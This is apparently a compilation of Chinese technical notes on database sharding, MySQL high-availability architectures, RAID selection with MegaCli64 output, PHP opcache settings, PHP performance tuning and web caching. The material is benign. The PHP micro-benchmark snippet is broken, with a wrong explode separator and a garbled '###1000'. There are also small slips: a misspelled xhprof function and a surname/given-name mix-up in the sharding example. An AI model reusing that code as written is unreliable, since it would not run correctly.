数据库分片（Database shards）是无共享架构的一个例子。这意味着分片是自治的：分片间不共享任何相同的数据或服务器资源。但是在某些情况下，将某些表复制到每个分片中作为参考表是有意义的。例如，假设某个应用程序的数据库依赖于重量测量的固定转换率。通过将包含必要转换率数据的表复制到每个分片中，有助于确保查询所需的所有数据都保存在每个分片中。

通常，分片（Sharding）在应用程序级别进行实现。这意味着应用程序包含“要向哪个分片发送读和写”的代码。但是，某些数据库管理系统内置了分片功能，允许您直接在数据库级别实现分片。

以上是分片（Sharding）的概述，接下来让我们来看一下，这种数据库架构的优点和缺点。

Benefits of Sharding 分片的好处
数据库分片的主要吸引力在于，它可以帮助促进水平扩展（horizontal scaling），也称为向外扩展（scaling out）。水平扩展是将更多的机器添加到现有堆栈中，以分散负载，允许更多的流量和更快的处理。这通常与垂直扩展（vertical scaling）形成对比，垂直扩展也称为向上扩展（scaling up），是指升级现有服务器的硬件，通常是添加更多内存或CPU。

让一个关系数据库在单个机器上运行，并按需升级其服务器资源进行向上扩展是相对简单的。但最终，任何非分布式数据库在存储和计算能力方面都会受到限制，因此可以自由地水平扩展数据库，会使您的架构更加灵活且适应性强。

选择分片数据库架构的另一个原因，是为了加速查询响应的时间。当您对尚未分片的数据库提交查询时，必须先搜索您查询的表中的每一行，然后才能找到您要查找的结果集。对于具有大型单片数据库的应用程序，查询可能变得极其缓慢。但是，通过将一个表分成多个，查询过程会遍历更少的行，并且返回结果集的速度要快得多。

分片还可以通过减少宕机（outage）的影响，使应用程序更稳定可靠。如果您的应用程序或网站依赖于未分片的数据库，则宕机可能会导致整个应用程序不可用。但是，对于分片数据库，宕机可能只会影响单个分片。即使这可能使某些用户无法使用应用程序或网站部分功能，但仍会低于整个数据库崩溃带来的影响。

Drawbacks of Sharding 分片的缺点
虽然对数据库进行分片可以使扩展更容易并提高性能，但它也可能会带来某些限制。在这里，我们将讨论其中的一些限制，以及为什么这些限制会让我们避免对数据库全部分片。

正确实现分片数据库架构，是十分复杂的，所以这是分片遇到的第一个困难。如果操作不正确，则分片过程可能会导致数据丢失或表损坏，这是一个很大的风险。但是，即使正确地进行了分片，也可能对团队的工作流程产生重大影响。与从单个入口点访问和管理数据不同，用户必须跨多个分片位置管理数据，这可能会让某些团队存在工作混乱。

在对数据库进行分片后，用户有时会遇到的一个问题是分片最终会变得不平衡。举例来说，假设您有一个数据库，其中有两个单独的分片，一个用于姓氏以字母A到M开头的客户，另一个用于名字以字母N到Z开头的客户。但是，您的应用程序为姓氏以字母G开头的人提供了过多的服务。因此，A-M分片逐渐累积的数据比N-Z分片要多，这会导致应用程序速度变慢，并对很大一部分用户造成影响。A-M分片已成为所谓的数据热点。在这种情况下，数据库分片的任何好处都被慢速和崩溃抵消了。数据库可能需要修复和重新分片，才能实现更均匀的数据分布。

另一个主要缺点是，一旦对数据库进行了分片，就很难将其恢复到未分片的架构。分片前数据库的备份数据，都无法与分片后写入的数据合并。因此，重建原始的非分片架构，需要将新的分区数据与旧备份合并，或者将分区的数据库转换回单个数据库，这两种方法都是昂贵且耗时的。

要考虑的最后一个缺点是，并不是每个数据库引擎本身都支持分片。例如，尽管可以手动分片PostgreSQL数据库，但PostgreSQL本身并不包括自动分片功能。有许多Postgres分支包括自动分片功能，但这些分支通常落后于最新的PostgreSQL版本，并且缺乏某些其他的功能特性。一些专业的数据库技术——如MySQL Cluster或某些数据库即服务产品（如MongoDB Atlas）确实包含自动分片功能，但这些数据库管理系统的普通版本却并不包含。因此，分片通常需要“自己动手”的方法。这意味着通常很难找到有关分片或故障排除技巧的文档。

现在我们已经介绍了一些分片的缺点和好处，我们将讨论一些分片数据库的不同架构。

一旦你决定对数据库进行分片，接下来你需要弄清楚的是如何进行分片。在运行查询或将传入的数据分发到分片表或数据库时，关键是要将其分配到正确的分片。否则，它可能导致数据丢失或查询速度缓慢。在本节中，我们将介绍一些常见的分片架构，每个架构使用稍微不同的流程来跨分片分发数据。

Key Based Sharding 基于键的分片
img

添加描述

为了确保数据记录以正确的方式被放置在正确的分片中，哈希函数中输入的值都应该来自同一列。此列称为分片键。简单来说，分片键与主键类似，因为它们都是列，用于为各个行建立唯一标识符。一般来说，分片键应该是静态的，这意味着它不应包含可能随时间变化的值。否则，它会增加更新操作的工作量，并可能降低性能。

虽然基于键的分片是一种相当常见的分片架构，但在尝试动态添加或删除数据库中的其他服务器时，它会使事情变得棘手。在添加服务器时，每个服务器都需要一个相应的哈希值，并且许多现有条目（如果不是全部）都需要重新映射到新的正确哈希值，然后迁移到相应的服务器。当您开始重新平衡数据时，新旧哈希函数都不会有效。因此，在迁移期间，您的服务器将无法编写任何新数据，您的应用程序可能会停机。

这种策略的主要吸引力在于，它可以用于均匀分布数据，从而防止热点。此外，由于它以算法方式分配数据，因此无需维护所有数据所在位置的映射，而其他策略（如范围或基于目录的分片）必须维护数据位置的映射。

Range Based Sharding 基于范围的分片
基于范围的分片（Range based sharding），基于给定值的范围进行数据分片。为了说明，假设您有一个数据库，用于存储零售商目录中所有产品的信息。您可以创建一些不同的分片，并根据每个产品的价格范围分配每个产品的信息，如下所示：

img

添加描述

基于范围的分片的主要好处是，它实现起来相对简单。每个分片都包含一组不同的数据，但它们都具有相同的模式，以及原始数据库。应用程序代码只读取数据所属的范围，并将其写入相应的分片。

另一方面，基于范围的分片并不能预防数据不均匀分布的现象，而有可能会出现前面提到的数据热点现象。查看示例图，即使每个分片拥有相同数量的数据，特定产品比其他产品获得更多关注的可能性也会很大。相应的，各个的分片将接收不成比例的读取操作。

Directory Based Sharding 基于目录的分片
要实现基于目录的分片，必须创建并维护一个查找表，该查找表使用分片键来跟踪哪个分片包含哪些数据。简而言之，查找表是一个表，其中包含有关可以找到特定数据的静态信息集。下图显示了基于目录的分片的简单示例：

img

添加描述

此处，Delivery Zone列被定义为分片键。将来自分片键的数据，连同每一行应该写入的分片写入查找表。这与基于范围的分片类似，但不是确定分片键的数据落入哪个范围，而是将每个键绑定到其自己的特定分片。如果分片键的基数很低，并且分片键存储键的范围没有意义，那么基于目录的分片比基于范围的分片要更好。请注意，它也不同于基于密钥的分片，因为它不通过散列函数处理分片键; 它只是根据查找表检查键值，以查看数据需要写入的位置。

基于目录的分片的主要吸引力在于其灵活性。基于范围的分片架构只能指定键值范围，而基于键的分片架构只能使用固定的哈希函数，如前所述，在以后更改该函数非常困难。另一方面，基于目录的分片允许您使用任何系统或算法将数据项分配给分片，使用这种方法动态添加分片也相对容易。

虽然基于目录的分片是这里讨论的最灵活的分片方法，但是在每次查询或写入之前连接到查找表，可能会对应用程序的性能产生不利影响。此外，查找表可能出现单点故障：如果查询表损坏或出现其他故障，它可能会影响数据库写入新数据或访问现有数据的能力。

Should I Shard? 我应该分片吗？
是否应该实现分片数据库架构，几乎总是一个争论的问题。有些人认为分片对于达到一定规模的数据库来说，是不可避免的结果。而另一些人则认为这是一个令人头疼的问题，除非绝对必要，否则应该避免，因为分片增加了操作的复杂性。

由于这种增加的复杂性，通常仅在处理非常大量的数据时才执行分片。以下是一些常见方案，可能对数据库分片的操作有所帮助：

· 应用程序数据量增长到超过单个数据库节点的存储容量。

· 对数据库的读写量，超过单个节点或其只读副本可以处理的量，从而导致响应时间增加或超时。

· 应用程序所需的网络带宽，超过单个数据库节点和任何只读副本可用的带宽，从而导致响应时间增加或超时。

在分片之前，您应该用尽所有其他选项来优化数据库。您可能需要考虑的一些优化包括：

设置远程数据库。如果您使用的是一个整体应用程序，其中所有组件都位于同一个服务器上，那么可以通过将数据库移到它自己的机器上来提高数据库的性能。由于数据库的表保持不变，因此这不会增加分片的复杂性。但是，它仍然允许您垂直伸缩数据库，使其与基础结构的其他部分分离。

实现缓存。如果您的应用程序的读取性能导致您遇到麻烦，那么缓存是一种可以帮助改进它的策略。缓存涉及临时存储已在内存中请求的数据，以便您以后更快地访问它。

创建一个或多个只读副本。另一种有助于提高读取性能的策略，包括将数据从一个数据库服务器（主服务器）复制到一个或多个从服务器。在此之后，每次新的写操作在复制到从服务器之前都要先到主服务器，而读操作只对从服务器进行。像这样分发读写可以防止任何一台机器承担过多的负载，从而有助于防止速度下降和崩溃。请注意，创建读副本需要更多的服务器资源，因此花费更多的钱，这对一些人来说可能是一个很大的限制。

升级到更大的服务器。在大多数情况下，将一个数据库服务器扩展到具有更多资源的计算机比分片需要更少的工作量。与创建只读副本一样，具有更多资源的服务器升级可能会花费更多的钱。因此，只有当它确实是您的最佳选择时，您才应该进行服务器扩容。

请记住，如果您的应用程序或网站增长超过某个点，这些策略本身都不足以提高性能。在这种情况下，分片可能确实是您的最佳选择。

Conclusion 结语
对于那些希望横向扩展数据库的人来说，分片是一个很好的解决方案。但是，它还会增加很多复杂性，并为您的应用程序创建更多潜在的故障点。分片对于某些人来说可能是必要的，但是创建和维护分片架构所需的时间和资源可能会超过对其他人的好处。

通过阅读这篇概念性文章，您应该更清楚地了解分片的优缺点。接下来，您可以使用这些见解来对分片数据库架构是否适合您，做出更明智的决定。
```

### 高可用集群
```
https://www.cnblogs.com/rouqinglangzi/p/10921982.html
一、Mysql高可用解决方案
方案一：共享存储
一般共享存储采用比较多的是 SAN/NAS 方案。

方案二：操作系统实时数据块复制
这个方案的典型场景是 DRBD，DRBD架构(MySQL+DRBD+Heartbeat)

方案三：主从复制架构
主从复制(一主多从)

MMM架构(双主多从)

MHA架构(多主多从)

方案四：数据库高可用架构
这种方式比较经典的案例包括 MGR(MySQL Group Replication)和 Galera 等，最近业内也有一些类似的尝试，如使用一致性协议算法，自研高可用数据库的架构等。

1.MGR(MySQL Group Replication，MySQL官方开发的一个实现MySQL高可用集群的一个工具。第一个GA版本正式发布于MySQL5.7.17中)

2.Galera

其它方案：MySQL Cluster和PXC
MySQL Cluster(ndb存储引擎，比较复杂，业界并没有大规模使用)

PXC(Percona XtraDB Cluster)

如何选择合适的Mysql集群架构？
MHA看业务规模和需求选择

mysql官方的Mysql Cluster。比较复杂，团队有人、资源充足，可以考虑尝试，貌似用的人不多。

小团队或资源不足或小项目直接建议阿里云、腾讯云

 

回到顶部
二、部分常见方案的简介
1.Mysql主从架构


2.MHA 架构(Master High Availability Manager and Toolsfor MySQL)
参考：生产环境MySQL数据库集群MHA上线实施方案

MHA(Master High Availability Manager and Toolsfor MySQL)目前在Mysql高可用方面是一个相对成熟的解决方案。它是日本的一位MySQL专家采用Perl语言编写的一个脚本管理工具，该工具仅适用于MySQLReplication 环境，目的在于维持Master主库的高可用性。

MHA是基于标准的MySQL复制(异步/半同步)。

MHA是由管理节点(MHA Manager)和数据节点(MHA Node)两部分组成。

MHA Manager可以单独部署在一台独立机器,也可以部署在一台slave上。



3.MMM 架构(Master-Master replication manager for Mysql)
可参考：MySQL-MMM实现MySQL高可用

MMM，全称为Master-Master replication manager for Mysql，是一套支持双主故障切换和双主日常管理的脚本程序，MMM使用Perl语言开发。主要用来监控和管理MySQL Master-Master(双)复制。特别适合DBA做维护等需要主从复制的场景，通过双主架构避免了重复搭建从库的麻烦。虽然叫做双主复制，但是业务上同一时刻只允许对一个主进行写入，另一台备选主上提供部分读服务，以加速在主主切换时备选主的预热。

(MMM好像不靠谱，据说不稳定，但还是有人在用)



MMM优缺点
　　优点：高可用性，扩展性好，出现故障自动切换，对于主主同步，在同一时间只提供一台数据库写操作，保证的数据的一致性。
　　缺点：Monitor节点是单点，可以结合Keepalived实现高可用。

4.DRBD 架构(MySQL+DRBD+Heartbeat)
 官网：https://www.linbit.com/en/drbd-community/drbd-download/

 

回到顶部
三、读写分离解决方案
客户端解决方案（应用层）：TDDL、 Sharding-Jdbc (常用shardding-jdbc)
中间件解决方案（代理层）：mysql proxy、mycat、altas  (常用mycat)
           

 

客户端解决方案的特点：

优点：

　　1、程序自动完成，数据源方便管理

　　2、不需要维护，因为没用中间件

　　3、理论支持任何数据库 （sql标准）

缺点：

　　1、增加了开发成本、代码有入侵

　　2、不能做到动态增加数据源

　　3、程序员开发完成，运维参与不了。

 

中间件解决方案的特点：

优点：

　　1、数据增加了都程序没用任何影响

　　2、应用层（程序）不需要管数据库方面的事情

　　3、增加数据源不需要重启程序

缺点：

　　1、程序依赖中间件，导致切换数据库变的困难

　　2、增加了proxy 性能下降

　　3、增加了维护工作、高可用问题。

```

### RAID
```
https://www.cnblogs.com/mysql-dba/p/7120601.html
作为一名DBA，选择自己的数据存储在什么上面，应该是最基本的事情了。但是很多DBA却容易忽略了这一点，我就是其中一个。之前对raid了解的并不多，本文就记录下学习的raid相关知识。

一、RAID的基础知识

【定义】RAID(Redundant Array of Independent Disk)是一种独立冗余磁盘阵列。

1、为什么要使用RAID?

我们知道，单块磁盘无论是从性能上、容量上、还是安全上都存在单点问题，如果把多块硬盘组成一个group，当成一个逻辑驱动器，从而实现同时从多块硬盘存取数据，那样可以提高了存储的吞吐量，同时也提高了存取速度和扩大存储容量。

RAID(Redundant Array of Independent Disk 独立冗余磁盘阵列)技术就是专门干这事的。RAID就是一种由多块廉价磁盘构成的冗余阵列，在操作系统下是作为一个独立的大型存储设备出现。RAID可以充分发挥出多块硬盘的优势，可以提升硬盘速度，增大容量,提供容错功能够确保数据安全性，易于管理的优点，在任何一块硬盘出现问题的情况下都可以继续工作，不会受到损坏硬盘的影响，这对于数据库存储领域是非常必要的。

2、RAID的几种工作级别

我们比较常用的RAID级别有RAID-0、RAID-1、RAID-10/RAID-01、RAID-5，其他的如RAID-3、RAID-4、RAID-6就不在此介绍了。

RAID-0
         RAID-0采用数据分条技术（Striped）把多块磁盘串联成一个更为庞大的磁盘组，可以提高磁盘的性能和吞吐量。它读写数据的速度是最快的，要求比较低，要求两个磁盘即可做RAID-0，相对成本是最低的，但是RAID-0不提供冗余或奇偶校验数据的功能，如果驱动器出现故障，数据将无法恢复，安全性最弱。一般只是在那些对性能要求高、数据安全性要求不高的情况下才被使用，不适合数据库的存储。



RAID-1
        RAID-1采用镜像（Mirroring）的方式冗余数据。RAID-1要求至少两个或2xN个磁盘，每次写数据时会同时写入镜像盘。这种阵列可靠性很高，但其有效容量减小到总容量的一半，同时这些磁盘的大小应该相等，否则总容量只具有最小磁盘的大小。RAID-1的数据安全性在所有的RAID级别上来说是最好的。但是其磁盘的利用率却只有50%，是所有RAID级别中最低的。



RAID-10
        由于RAID-0和RAID-1都存在明显的优点和缺点，为了结合两者的优点、避免两者的缺点，从而产生了RAID-10，RAID-10适合用在速度需求高，又要完全容错，当然成本也很多的应用。不过在做RAID-10时需要注意的是先做RAID-1，再做RAID-0还是先做RAID-0，再做RAID-1，二者还是有区别的。举个栗子，假如现在有四块磁盘：

        先做RAID-0，再做RAID-1：每两块磁盘先做RAID-0，在此基础上，再把两个RAID-0做成RAID-1。这时如果A类或者B类磁盘同时有一个故障，整个RAID将不可用。

(RAID 0) A = (Drive A1 + Drive A2) (Striped)
(RAID 0) B = (Drive B1 + Drive B2) (Striped)
(RAID-1)AB = (A +  B) (Mirrored)
       先做RAID-1，再做RAID-0：每两块磁盘先做RAID-1，在此基础上，再把两个RAID-1做成RAID-0。这时只有A类或者B类磁盘两个都故障时，整个RAID才不可用。

(RAID-1) A = (Drive A1 + Drive A2) (Mirrored)
(RAID-1) B = (Drive B1 + Drive B2) (Mirrored)
(RAID-0)AB = (A +  B) (Striped)
综合上面来看，先做RAID-1，再做RAID-0相对更安全，建议这种方式，所以我们平时说的RAID-10就是先做RAID-1，再做RAID-0。

RAID-5
        RAID-5应该处于RAID-0和RAID-1之间的一种工作模式，它尽量平衡RAID-0和RAID-1的优点和缺点，是我们平时使用比较多的一种模式。做RAID-5至少需要三块磁盘，它采用校验码冗余数据，校验信息分布在多个磁盘上，当数据每次写入到磁盘上，同时还需要写入校验信息，因此写入性能相对不如RAID-0。当某个磁盘出现故障，可以使用其他磁盘上校验信息来恢复数据。相对RAID-1，它磁盘空间利用率为(N-1)/N



3、RAID的几种工作级别优缺点

 

【注】以上的高、中、低只是相对于RAID-0、RAID-1、RAID-10、RAID-5而言。

 

二、如何判断RAID级别、写入策略、电池状况

 1、判断RAID级别：MegaCli64工具输入磁盘信息如下：

复制代码
[root()@xxxx ~]# MegaCli64 -LdInfo -lAll -aALL
                                     
Adapter 0 -- Virtual Drive Information:
Virtual Drive: 0 (Target Id: 0)
Name                :
RAID Level          : Primary-1, Secondary-0, RAID Level Qualifier-0
Size                : 278.875 GB
Is VD emulated      : No
Mirror Data         : 278.875 GB
State               : Optimal
Strip Size          : 64 KB
Number Of Drives    : 2
Span Depth          : 1
Default Cache Policy: WriteBack, ReadAhead, Direct, No Write Cache if Bad BBU
Current Cache Policy: WriteBack, ReadAhead, Direct, No Write Cache if Bad BBU
Default Access Policy: Read/Write
Current Access Policy: Read/Write
Disk Cache Policy   : Disabled
Encryption Type     : None
Default Power Savings Policy: Controller Defined
Current Power Savings Policy: None
Can spin up in 1 minute: Yes
LD has drives that support T10 power conditions: Yes
LD's IO profile supports MAX power savings with cached writes: No
Bad Blocks Exist: No
PI type: No PI

Is VD Cached: No


Virtual Drive: 1 (Target Id: 1)
Name                :
RAID Level          : Primary-1, Secondary-0, RAID Level Qualifier-0
Size                : 2.180 TB
Is VD emulated      : Yes
Mirror Data         : 2.180 TB
State               : Optimal
Strip Size          : 64 KB
Number Of Drives per span   : 2
Span Depth          : 3
Default Cache Policy: WriteBack, ReadAhead, Direct, No Write Cache if Bad BBU
Current Cache Policy: WriteBack, ReadAhead, Direct, No Write Cache if Bad BBU
Default Access Policy: Read/Write
Current Access Policy: Read/Write
Disk Cache Policy   : Disabled
Encryption Type     : None
Default Power Savings Policy: Controller Defined
Current Power Savings Policy: None
Can spin up in 1 minute: No
LD has drives that support T10 power conditions: No
LD's IO profile supports MAX power savings with cached writes: No
Bad Blocks Exist: No
PI type: No PI

Is VD Cached: No
复制代码
网上有人仅仅通过RAID Level列中的Primary-1, Secondary-0, RAID Level Qualifier-0来判断，我认为不是很准确。先来了解下Primary、Secondary、RAID Level Qualifier啥意思？

Primary字段：基本上可以确定RAID的级别，但是无法区分是RAID-1和RAID-10，因为有情况下他们的Primary值都是Primary-1, Secondary-0, RAID Level Qualifier-0

在这种情况下如何区分RAID-1和RAID-10？我认为还得结合另外两列进行判断：

Number Of Drives per span   : 2    #每个区段有2块磁盘
Span Depth                  : 3    #一共三个区段
结合primary-1，该RAID表示一共六块磁盘，每两个做RAID-1，最后将三个RAID-1做RAID-0
【总结：如何判断RAID级别】：

1)  除了RAID-1和RAID-10，其他级别通过Primary字段值就可以判断；

2) 至于RAID-1和RAID-10，还需要结合Number Of Drives （per span）、Span Depth两列的值，如果Span Depth值为1表示为RAID-1，不为1表示RAID-10;还有一种情况：Primary-1, Secondary-3, RAID Level Qualifier-0也是表示RAID-10;

 

 

2、判断RAID写入策略和电池状态

 

RAID的写入策略对IO性能有很大影响，有两种写入策略：

WriteBack：表示写入到磁盘缓存上，写入性能好，如果采用此策略，RAID必须支持电池可用，否则一旦断点，数据将丢失。
WriteThrough：表示直接写入到硬盘上，写入性能没有WriteBack好，一般没有电池时采用此策略
2.1）查看RAID的写入策略

复制代码
[root()@xxxx ~]# MegaCli64 -LDInfo -Lall -aALL|grep 'Cache Policy'
**********************************************************************************
Default Cache Policy: WriteBack, ReadAdaptive, Direct, Write Cache OK if Bad BBU
Current Cache Policy: WriteBack, ReadAdaptive, Direct, Write Cache OK if Bad BBU 
以上表示采用WriteBack（回写）策略，如果电池坏了也强制写入cache
  Default Cache Policy: WriteThrough, ReadAheadNone, Direct, No Write Cache if Bad BBU
  Current Cache Policy: WriteThrough, ReadAheadNone, Direct, No Write Cache if Bad BBU

  如果是这个，表示采用WriteThrough策略

**********************************************************************************
Disk Cache Policy   : Disabled     #表示硬盘的cache，一般这里禁用，防止丢失数据
复制代码
2.2）查看电池状态

[root()@xxxx ~]# MegaCli64 -adpbbucmd -aall |grep -E  'Battery State|Charger Status|isSOHGood|Relative State of Charge'                        
Battery State     : Operational  #电池状态，operational表示正在运行
Relative State of Charge: 98 %   #电池电量，如果低于15%，那么写入策略会由WB转变为WC,IO性能下降，需要关注
Charger Status: Complete         #充电情况，表示已完成
isSOHGood: Yes                   #不是Yes需要关注
 

三、MySQL适合的RAID存储方案

 通过上面对RAID的了解，我们已经知道各级别RAID的优缺点，对于MySQL数据库的存储，如何选择RAID级别呢？

 我们可以根据MySQL各种文件类型分别选择，MySQL数据库重要的文件类型有：

1、数据文件(frm,ibd)：存储核心的数据，非常重要，安全性要求高，同时需要频繁的写入、更新数据，磁盘性能要求也比较高，首先建议物理磁盘是SSD，对于RAID的选择，如果预算足够，建议RAID-10，其次是RAID-5

2、二进制日志文件：写入非常频繁，写性能要求高，由于从库依赖该文件，安全性也很重要，综合成本考虑，可以用两块SATA硬盘，做成RAID-1即可。

3、redo文件，共享表空间文件：安全性要求高，如果预算足够，RAID-10，通常RAID-1也是可以的，一般而言，redo文件和共享表空间和数据文件存储在一起即可。
```

### 源代码编译、内存调优
```
https://www.cnblogs.com/lin3615/p/5638219.html
最近安装了 php5.6，发现有了 opcache.so扩展文件，于是，搜索了一下，
发现 zend opcache已经融入到 ph5.5以上的版本了,即兴奋，不用再去找
xcache,apc,eAccelerator 这些缓存了
PHP手册上面也说了好详细的配置文件说明，这里不再详情说明,
最好是把编译生成的 opcache.so和别的扩展放一起
基本的配置可以这样配置即可(php.ini文件)
zend_extension=opcache.so
opcache.enable=1
opcache.enable_cli=1
opcache.memory_consumption=128
opcache.interned_strings_buffer=8
opcache.max_accelerated_files=100000
opcache.validate_timestamps=1
opcache.revalidate_freq=7200
以上的是基本配置，就可以使用了，具体更高级，根据实际情况，
可以修改相关参数设置，手册上面已经说得好清楚了
几乎什么事情，用得好就是如虎添冀，用不好，就是一个大坑。
所以，如果启用了，文件修改了，时间不到，还没有生效,
所以，为了立即生效，可以重新web服务，但一般这些不可取，会造成中断
opache提供了 opcache_invalidate(文件名,true),此时则立即重新编译,
opcache_reset()这个是在生成此文件前生效，如果一旦生成了，还没有
过期的，则不会生效.所以，要做到让变更的文件立即生效，可以生成一个文件，
当有更改文件时，执行一下这个文件即可

1
2
3
4
<?php
// as: change.php
opcache_reset();
opcache_invalidate('文件路径', true); // 立即重新编译,可以用绝对路径
```


### php性能优化
```
php语言级的性能优化
优化点：少写代码，多用php自身能力
- 性能问题：自身代码冗余较多，可读性不佳，并且性能低。
- 为什么性能低：php代码需要编译解析为底层语言，这一过程每次请求都会处理一遍，开销大。
- 解决方案：多用php内置变量、常量、函数
- 测试方法：直接使用ab对比

优化点：php内置函数的性能优劣
- 性能问题：php内置函数，之间依然存在快慢差异
- 解决方案：多去了解php内置函数的时间复杂度
- 测试方法：对比isset()和array_key_exists()的性能差异
<?php
    $start = current_time();
    $i = 0;
    $arr = range(1, 200000);
    while($i<200000){
        ++$i;
        //isset($arr[$i]);
        array_key_exists($i,$arr);
    }
    $end = current_time();
    echo "Lost Time:". number_format($end-$start,3)###1000;
    echo "\n";
    function current_time(){
        list($usec, $sec) = explode(" ".microtime());
        return ((float)$usec + (float)$sec);
    }
?>
优化点：尽可能少用魔法函数
- 情况描述：php提供的魔法函数，性能不佳
- 为什么性能低：为了给php程序员省事，php语言为你做了很多
- 解决方案：尽可能规避使用魔法函数
- 测试方法：time php test.php
    - time  liunx命令
    - php 指定程序
    - test.php 指定文件 
    > 注意：php主要在返回值中看user耗时

优化点：产生额外开销在错误抑制符
- 情况描述：php提供的错误抑制符只是为了方便懒人
- @的实际逻辑：在代码开始前，结束后，增加Opcode,忽略报错
    vld php Opcode查看扩展:用于将Opcode显示出来
- 解决方案：尽量不要使用@错误抑制符
- 测试方法：php -dvld.active=1 -dvld.execute=0 at.php
    
- php 执行php的vld显示Opcode
    
优化点：避免在循环内做运算
- 情况描述：循环内在函数或运算会被重复执行
- 解决方案：在循环外获取需要在值，再给循环操作

优化点：减少计算密集型业务
- 情况描述：php不适合密集型的场景
- 为什么：php语言特性决定php不适合做大数据业务
- php适合场景：适合衔接webserver与sql

优化点：务必使用带引号字符串做键值
- 情况描述：php会将没有引号的键值当作常量，产生查找常量在开销。
- 解决方案：严格使用带引号作为键值

php周边问题的性能优化
- php周边有什么:
    - linux运行环境
    - 文件存储  硬盘
    - 数据库    mysql
    - 缓存      redis
    - 网络  

优化点：减少文件类操作
- 常见php场景在开销次序
读写内存 << 读写数据库 << 读写磁盘 << 读写网络数据

优化点：优化网络请求
- 网络请求的坑：
    1. 对方接口的不确定因素
    2. 网络稳定性
- 如何优化网络请求：
    - 设置超时时间
    1. 连接超时 <200ms
    2. 读超时   <800ms
    3. 写超时   <500ms
    - 将串行请求并行化
    1. 使用curl_multi_###()
    2. 使用swoole扩展

优化点：压缩php接口输出
- 如何压缩：使用Gzip即可
- 压缩的利于弊：利于我们的数据输出，Client段能更快获取数据;弊端为会有额外的CPU开销

优化点：缓存重复计算内容
- 什么情况下坐输出内容缓存：多次请求，内容不变情况

重叠时间窗口思想===并行
旁路方案===并行

php语言自身分析、优化
 php性能分析

工具:XHPorf（源自FackBook的php性能分析工具）
实践：通过分析Wordpress程序，做优化。
使用: php --ri xhprof   查看版本
在入口文件index.php添加

xhprof_enable();

// ...

$data = xhporf_disable();
include_once "/var/www/html/xhprof_lib/utils/xhprof_lib.php";
include_once "/var/www/html/xhprof_lib/utils/xhprof_runs.php";
$objXhprofRun = new XHProfRuns_Default();
$run_id = $objXhprofRun->save_run($data,"test");
var_dump($run_id);
查看xhp目录查看相关信息
参数：
    runction_name   函数名
    calls   被调用在次数
    InclWallTime    当流程走到该函数，之前和现在这个函数处理在总耗时
    ExclWallTime    这个函数执行了多少微秒

其他工具推荐：
    ab  压力测试
    vld opcode代码分析

php性能瓶颈解决方案：
    Opcode Cache:php扩展APC等
    peci.php.net    php扩展网站
    使用php扩展解决复杂的业务
    Runtime优化:HHVM

 Apache Benchmark(ab)

> ab是由Apache提供的压力测试软件。安装apache服务器时会自带该压测软件
- 使用方法: ./ab -n1000 -c100 http://www.baidu.com/
    - -n 请求数
    - -c 并发数
    - http 压测目标地址
    - -h 帮助 

###*返回参数说明**
- Requests per second（每秒接受请求数尽可能多）
- Time per request（每秒请求在耗时尽可能少）
```

### 缓存
```
https://segmentfault.com/a/1190000019142897

SegmentFault
首页
问答
专栏
资讯
课程
活动
发现
搜索关键字

新亮
 2.4k
系统的讲解 - PHP 缓存技术
cdn缓存nosql缓存设计缓存php
发布于 2019-05-10
概述
缓存已经成了项目中是必不可少的一部分，它是提高性能最好的方式，例如减少网络I/O、减少磁盘I/O 等，使项目加载速度变的更快。

缓存可以是CPU缓存、内存缓存、硬盘缓存，不同的缓存查询速度也不一样（CPU缓存 > 内存缓存 > 硬盘缓存）。

接下来，给大家逐一进行介绍。

浏览器缓存
浏览器将请求过的页面存储在客户端缓存中，当访问者再次访问这个页面时，浏览器就可以直接从客户端缓存中读取数据，减少了对服务器的访问，加快了网页的加载速度。

强缓存
用户发送的请求，直接从客户端缓存中获取，不请求服务器。

根据 Expires 和 Cache-Control 判断是否命中强缓存。

代码如下：

header('Expires: '. gmdate('D, d M Y H:i:s', time() + 3600). ' GMT');
header("Cache-Control: max-age=3600"); //有效期3600秒
Cache-Control 还可以设置以下参数：

public：可以被所有的用户缓存（终端用户的浏览器/CDN服务器）
private：只能被终端用户的浏览器缓存
no-cache：不使用本地缓存
no-store：禁止缓存数据
协商缓存
用户发送的请求，发送给服务器，由服务器判定是否使用客户端缓存。

代码如下：

$last_modify = strtotime($_SERVER['HTTP_IF_MODIFIED_SINCE']);
if (time() - $last_modify < 3600) {
    header('Last-Modified: '. gmdate('D, d M Y H:i:s', $last_modify).' GMT');
    header('HTTP/1.1 304'); //Not Modified
    exit;
}
header('Last-Modified: '. gmdate('D, d M Y H:i:s').' GMT');
用户操作行为对缓存的影响
操作行为	Expires	Last-Modified
地址栏回车	有效	有效
页面跳转	有效	有效
新开窗口	有效	有效
前进/后退	有效	有效
F5刷新	无效	有效
Ctrl+F5刷新	无效	无效
文件缓存
数据文件缓存
将更新频率低，读取频率高的数据，缓存成文件。

比如，项目中多个地方用到城市数据做三级联动，我们就可以将城市数据缓存成一个文件（city_data.json），JS 可以直接读取这个文件，无需请求后端服务器。

全站静态化
CMS（内容管理系统），也许大家都比较熟悉，比如早期的 DEDE、PHPCMS，后台都可以设置静态化HTML，用户在访问网站的时候读取的都是静态HTML，不用请求后端的数据库，也不用Ajax请求数据接口，加快了网站的加载速度。

静态化HTML有以下优点：

有利于搜索引擎的收录（SEO）
页面打开速度快
减少服务器负担
CDN缓存
CDN（Content Delivery Network）内容分发网络。

用户访问网站时，自动选择就近的CDN节点内容，不需要请求源服务器，加快了网站的打开速度。

缓存主要包括 HTML、图片、CSS、JS、XML 等静态资源。

NoSQL缓存
Memcached 缓存
Memcached 是高性能的分布式内存缓存服务器。

一般的使用目的是，通过缓存数据库查询结果，减少数据库访问次数，以提高动态Web应用的速度、提高可扩展性。

它也能够用来存储各种格式的数据，包括图像、视频、文件等。

Memcached 仅支持K/V类型的数据，不支持持久化存储。

Memcache 与 Memcached 的区别

Memcached 从0.2.0开始，要求PHP版本>=5.2.0，Memcache 要求PHP版本>=4.3。
Memcached 最后发布时间为2018-12-24，Memcache 最后发布时间2013-04-07。
Memcached 基于libmemcached，Memcache 基于PECL扩展。
可以将 Memcached 看作是 Memcache 的升级版。

PHP Memcached 使用手册：

http://www.php.net/manual/zh/...

Memcached 经常拿来与 Redis 做对比，接下来介绍下 Redis 缓存。

Redis缓存
Redis 是一个高性能的 K/V 数据库。

Redis 很大程度补偿了 Memcached K/V存储的不足，比如 List（链表）、Set（集合）、Zset（有序集合）、Hash（散列），既可以将数据存储在内存中，也可以将数据持久化到磁盘上，支持主从同步。

总的来说，可以将 Redis 看作是 Memcached 的扩展版，更加重量级，功能更强大。

